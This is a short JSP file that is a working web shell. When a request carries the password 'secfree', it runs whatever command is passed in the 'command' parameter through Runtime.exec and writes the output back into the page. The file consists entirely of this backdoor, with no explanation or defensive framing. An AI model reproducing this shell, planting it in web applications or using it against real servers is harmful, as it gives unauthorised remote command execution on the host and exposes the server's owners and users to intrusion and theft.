<%
    if("secfree".equals(request.getParameter("password"))){
        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("command")).getInputStream();
        int a = -1;
        byte[] b = new byte[2048];
        out.print("");
        while((a=in.read(b))!=-1){
            out.println(new String(b));
        }
        out.print("");
    }
%>
